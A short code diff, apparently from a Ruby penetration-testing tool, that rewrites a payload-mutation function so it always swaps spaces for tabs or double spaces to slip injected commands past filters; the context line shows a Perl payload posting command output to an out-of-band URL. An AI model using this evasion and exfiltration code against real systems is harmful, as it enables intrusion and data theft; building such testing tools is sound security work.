@@ -405,16 +405,25 @@ LWP::UserAgent->new->post('#{oob_url}',Content=>'CMD_OUTPUT:'.$o)
 
     def apply_whitespace_variation(payload)
       # Use tabs and multiple spaces instead of single spaces
-      payload.gsub(/\s+/) do |match|
-        case rand(3)
-        when 0
-          "\t"
-        when 1
-          "  "
-        else
-          match
-        end
+      # Ensure we always make at least one change
+      changed = false
+      result = payload.gsub(/\s+/) do |match|
+        variation = case rand(2)  # Only use 0 or 1 to ensure change
+                   when 0
+                     "\t"
+                   else
+                     "  "
+                   end
+        changed = true if variation != match
+        variation
       end
+      
+      # If no spaces were found to change, add some variation
+      unless changed
+        result = result.gsub(/([a-zA-Z])([a-zA-Z])/) { |m| "#{$1}  #{$2}" }
+      end
+      
+      result
     end
 
     def apply_concatenation(payload)
